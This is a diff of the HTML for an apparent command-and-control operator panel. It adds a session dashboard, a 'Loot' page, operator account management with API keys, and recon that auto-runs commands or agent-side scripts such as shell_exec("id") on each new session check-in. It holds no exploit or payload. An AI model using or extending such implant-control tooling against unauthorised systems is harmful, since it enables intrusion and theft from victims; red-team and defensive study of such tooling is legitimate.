@@ -83,8 +83,12 @@
         <i class="fas fa-folder-open"></i><span>Files</span>
       </button>
       <button class="nav-item" data-page="loot"
-              onclick="window.Router.navigate(\'loot\',event)">
+              onclick="window.Router.navigate('loot',event)">
         <i class="fas fa-box-open"></i> Loot
+      </button>
+      <button class="nav-item" id="nav-users" data-page="users"
+              onclick="window.Router.navigate('users',event)">
+        <i class="fas fa-users-cog"></i> Users
       </button>
       <button class="nav-item" data-page="proxies"
               onclick="window.Router.navigate('proxies',event)">
@@ -159,6 +163,8 @@
 
       <!-- ── DASHBOARD ─────────────────────────────────────────────── -->
       <div id="page-stats">
+
+        <!-- Header -->
         <div class="page-header">
           <div>
             <h1 class="page-title">Dashboard</h1>
@@ -171,39 +177,96 @@
           </div>
         </div>
 
-        <div class="stat-grid">
+        <!-- Stat cards — always show all four, update counts dynamically -->
+        <div class="stat-grid" style="grid-template-columns:repeat(4,1fr);">
           <div class="stat-card accent">
+            <div class="stat-icon-wrap"><i class="fas fa-server stat-icon"></i></div>
             <div class="stat-label">Active Sessions</div>
             <div class="stat-value white" id="stat-total">0</div>
           </div>
           <div class="stat-card blue">
+            <div class="stat-icon-wrap"><i class="fab fa-windows stat-icon"></i></div>
             <div class="stat-label">Windows</div>
             <div class="stat-value blue" id="stat-win">0</div>
           </div>
-          <div class="stat-card yellow" style="display:none" id="stat-linux-card">
+          <div class="stat-card yellow">
+            <div class="stat-icon-wrap"><i class="fab fa-linux stat-icon"></i></div>
             <div class="stat-label">Linux</div>
             <div class="stat-value yellow" id="stat-linux">0</div>
           </div>
+          <div class="stat-card" id="stat-mac-card" style="display:none;">
+            <div class="stat-icon-wrap"><i class="fab fa-apple stat-icon"></i></div>
+            <div class="stat-label">macOS</div>
+            <div class="stat-value" id="stat-mac" style="color:var(--text-primary);">0</div>
+          </div>
+          <div class="stat-card" id="stat-other-card" style="display:none;">
+            <div class="stat-icon-wrap"><i class="fas fa-question-circle stat-icon"></i></div>
+            <div class="stat-label">Other</div>
+            <div class="stat-value" id="stat-other" style="color:var(--text-muted);">0</div>
+          </div>
         </div>
 
-        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:16px;" class="dashboard-grid-2">
-          <div class="card">
+        <!-- Middle row: chart left, activity feed right -->
+        <div class="dash-mid-grid">
+
+          <!-- OS doughnut chart -->
+          <div class="card dash-chart-card">
             <div class="card-header">
-              <span class="card-title"><i class="fas fa-chart-pie"></i> OS Distribution</span>
+              <span class="card-title"><i class="fas fa-chart-pie mr-2"></i>OS Distribution</span>
             </div>
-            <div class="card-body" style="max-height:200px;">
-              <canvas id="osChart"></canvas>
+            <div class="dash-chart-body">
+              <!-- Explicit-height wrapper so Chart.js has a pixel reference -->
+              <div style="position:relative;width:100%;height:190px;">
+                <canvas id="osChart"></canvas>
+              </div>
+              <!-- Custom legend rendered below the canvas, not inside it -->
+              <div id="chart-legend" class="dash-legend"></div>
             </div>
           </div>
-          <div class="card">
-            <div class="card-header">
-              <span class="card-title"><i class="fas fa-bolt"></i> Activity</span>
+
+          <!-- Live activity feed -->
+          <div class="card dash-activity-card" style="display:flex;flex-direction:column;min-height:0;">
+            <div class="card-header" style="flex-shrink:0;">
+              <span class="card-title"><i class="fas fa-bolt mr-2"></i>Activity</span>
+              <button onclick="document.getElementById('activity-log').innerHTML=''"
+                      class="btn btn-ghost btn-sm" title="Clear log">
+                <i class="fas fa-trash-alt"></i>
+              </button>
             </div>
-            <div class="card-body" style="padding:12px;">
-              <div id="activity-log" class="log-pane" style="height:160px;"></div>
+            <div style="flex:1;overflow-y:auto;min-height:0;padding:8px 4px;">
+              <div id="activity-log" class="log-pane" style="height:100%;min-height:200px;"></div>
             </div>
           </div>
         </div>
+
+        <!-- Sessions summary table -->
+        <div class="card" style="margin-top:16px;overflow:hidden;">
+          <div class="card-header">
+            <span class="card-title"><i class="fas fa-desktop mr-2"></i>Connected Sessions</span>
+            <span id="dash-session-count" class="text-xs" style="color:var(--text-muted);"></span>
+          </div>
+          <div style="overflow-x:auto;">
+            <table style="width:100%;border-collapse:collapse;font-size:13px;">
+              <thead>
+                <tr style="border-bottom:1px solid var(--border);">
+                  <th class="dash-th">Host</th>
+                  <th class="dash-th">OS</th>
+                  <th class="dash-th">IP</th>
+                  <th class="dash-th">Last Seen</th>
+                  <th class="dash-th" style="text-align:right;">Actions</th>
+                </tr>
+              </thead>
+              <tbody id="dash-sessions-tbody">
+                <tr>
+                  <td colspan="5" style="padding:28px;text-align:center;color:var(--text-muted);font-style:italic;">
+                    No active sessions
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
       </div>
 
       <!-- ── NETWORK MAP ────────────────────────────────────────────── -->
@@ -355,6 +418,92 @@
             </button>
           </div>
           <div id="loot-preview-body" class="flex-1 overflow-auto p-4 bg-[#0d1117] rounded-b-xl"></div>
+        </div>
+      </div>
+
+
+      <!-- USERS PAGE (admin only) -->
+      <div id="page-users" class="hidden" style="display:none;flex-direction:column;gap:16px;">
+        <div class="flex items-center justify-between">
+          <div>
+            <h1 class="page-title"><i class="fas fa-users-cog text-blue-400 mr-2"></i>Operators</h1>
+            <p class="page-subtitle">Create and manage panel user accounts — admin only</p>
+          </div>
+          <button onclick="window.UserManager.load()" class="btn btn-ghost btn-sm">
+            <i class="fas fa-sync-alt"></i> Refresh
+          </button>
+        </div>
+
+        <!-- API key banner (shown once after creation) -->
+        <div id="api-key-banner" class="hidden bg-yellow-900/40 border border-yellow-700/60
+             rounded-lg p-4 flex items-start gap-3">
+          <i class="fas fa-key text-yellow-400 mt-0.5"></i>
+          <div class="flex-1 min-w-0">
+            <p class="text-yellow-300 text-sm font-medium mb-1">
+              New operator API key — copy it now, it won't be shown again
+            </p>
+            <code id="api-key-value"
+                  class="text-xs text-yellow-200 font-mono break-all"></code>
+          </div>
+          <div class="flex gap-2 shrink-0">
+            <button onclick="window.UserManager.copyKey()"
+                    class="text-xs px-2 py-1 bg-yellow-700/60 hover:bg-yellow-700
+                           text-yellow-200 rounded">
+              <i class="fas fa-copy"></i> Copy
+            </button>
+            <button onclick="window.UserManager.dismissKey()"
+                    class="text-xs px-2 py-1 bg-gray-700 hover:bg-gray-600
+                           text-gray-300 rounded">
+              <i class="fas fa-times"></i>
+            </button>
+          </div>
+        </div>
+
+        <!-- Create new operator -->
+        <div class="card">
+          <div class="card-header">
+            <span class="card-title"><i class="fas fa-user-plus mr-2"></i>Create Operator</span>
+          </div>
+          <div class="flex gap-3 flex-wrap p-4">
+            <input id="new-username" type="text" placeholder="Username"
+                   class="form-input flex-1 min-w-32"
+                   onkeydown="if(event.key==='Enter') window.UserManager.create()">
+            <input id="new-password" type="password" placeholder="Password (min 8 chars)"
+                   class="form-input flex-1 min-w-40"
+                   onkeydown="if(event.key==='Enter') window.UserManager.create()">
+            <select id="new-role" class="form-select w-36">
+              <option value="operator">operator</option>
+              <option value="viewer">viewer</option>
+              <option value="admin">admin</option>
+            </select>
+            <button onclick="window.UserManager.create()"
+                    class="btn btn-primary btn-sm whitespace-nowrap">
+              <i class="fas fa-plus mr-1"></i>Create
+            </button>
+          </div>
+        </div>
+
+        <!-- Operator table -->
+        <div class="card flex-1 overflow-hidden">
+          <div class="card-header">
+            <span class="card-title"><i class="fas fa-list mr-2"></i>All Operators</span>
+          </div>
+          <div class="overflow-auto">
+            <table class="w-full text-left">
+              <thead class="border-b border-gray-700 text-xs text-gray-500 uppercase">
+                <tr>
+                  <th class="px-4 py-2">Username</th>
+                  <th class="px-4 py-2">Role</th>
+                  <th class="px-4 py-2">Created</th>
+                  <th class="px-4 py-2">Last Login</th>
+                  <th class="px-4 py-2"></th>
+                </tr>
+              </thead>
+              <tbody id="users-tbody">
+                <tr><td colspan="5" class="p-3 text-center text-gray-500">Loading…</td></tr>
+              </tbody>
+            </table>
+          </div>
         </div>
       </div>
 
@@ -562,19 +711,76 @@
             <button onclick="window.ReconConfig.refresh()" class="icon-btn"><i class="fas fa-sync"></i></button>
           </div>
           <div class="card-body" style="display:flex;flex-direction:column;gap:12px;">
-            <p style="font-size:12px;color:var(--text-muted);">Commands run automatically on each new session check-in.</p>
-            <div style="display:flex;gap:8px;">
-              <input type="text" id="recon-cmd-input" placeholder="whoami /all"
+            <p style="font-size:12px;color:var(--text-muted);">
+              Runs automatically on each new session check-in. Supports commands, server-side
+              Rhai modules, and agent-side extension scripts with arguments.
+            </p>
+
+            <!-- Type tabs -->
+            <div style="display:flex;gap:4px;border-bottom:1px solid var(--border);padding-bottom:8px;">
+              <button id="recon-tab-command"
+                      onclick="window.ReconConfig.selectType('command')"
+                      class="btn btn-ghost btn-sm"
+                      style="font-size:11px;">
+                <i class="fas fa-terminal mr-1"></i>Command
+              </button>
+              <button id="recon-tab-module"
+                      onclick="window.ReconConfig.selectType('module')"
+                      class="btn btn-ghost btn-sm"
+                      style="font-size:11px;opacity:.5;">
+                <i class="fas fa-scroll mr-1"></i>Module / Script
+              </button>
+              <button id="recon-tab-extension"
+                      onclick="window.ReconConfig.selectType('extension')"
+                      class="btn btn-ghost btn-sm"
+                      style="font-size:11px;opacity:.5;">
+                <i class="fas fa-code mr-1"></i>Extension
+              </button>
+            </div>
+
+            <!-- Command input -->
+            <div id="recon-row-command" style="display:flex;gap:8px;">
+              <input type="text" id="recon-cmd-input"
+                     placeholder="e.g. whoami  (shell prefix added automatically)"
                      class="form-input form-mono" style="flex:1;"
                      onkeydown="if(event.key==='Enter') window.ReconConfig.add()">
               <button onclick="window.ReconConfig.add()" class="btn btn-primary btn-sm">Add</button>
             </div>
+
+            <!-- Module input -->
+            <div id="recon-row-module" style="display:none;gap:8px;align-items:center;">
+              <select id="recon-module-select" class="form-select" style="flex:1;">
+                <option value="">Loading modules…</option>
+              </select>
+              <button onclick="window.ReconConfig.add()" class="btn btn-primary btn-sm">Add</button>
+            </div>
+
+            <!-- Extension input -->
+            <div id="recon-row-extension" style="display:none;flex-direction:column;gap:8px;">
+              <textarea id="recon-ext-code" rows="4"
+                        placeholder="Rhai extension code that runs on the agent&#10;Example: let out = shell_exec(&quot;id&quot;); print(out);"
+                        class="form-input form-mono"
+                        style="resize:vertical;font-size:11px;"></textarea>
+              <div style="display:flex;gap:8px;">
+                <input type="text" id="recon-ext-args"
+                       placeholder="Arguments (space-separated, optional)"
+                       class="form-input" style="flex:1;font-size:12px;">
+                <button onclick="window.ReconConfig.add()" class="btn btn-primary btn-sm">Add</button>
+              </div>
+            </div>
+
+            <!-- Entry table -->
             <table class="data-table">
               <thead>
-                <tr><th style="width:40px;">#</th><th>Command</th><th style="width:40px;"></th></tr>
+                <tr>
+                  <th style="width:32px;">#</th>
+                  <th style="width:60px;">Type</th>
+                  <th>Entry</th>
+                  <th style="width:40px;"></th>
+                </tr>
               </thead>
               <tbody id="recon-tbody">
-                <tr class="empty-row"><td colspan="3">Click sync to load</td></tr>
+                <tr class="empty-row"><td colspan="4">Click sync to load</td></tr>
               </tbody>
             </table>
           </div>
@@ -998,6 +1204,7 @@ window.MobileMore = {
 <script src="/panel/js/recon.js"></script>
 <script src="/panel/js/notes.js"></script>
 <script src="/panel/js/builder.js"></script>
+<script src="/panel/js/users.js"></script>
 <script src="/panel/js/loot.js"></script>
 <script src="/panel/js/app.js"></script>
 </body>
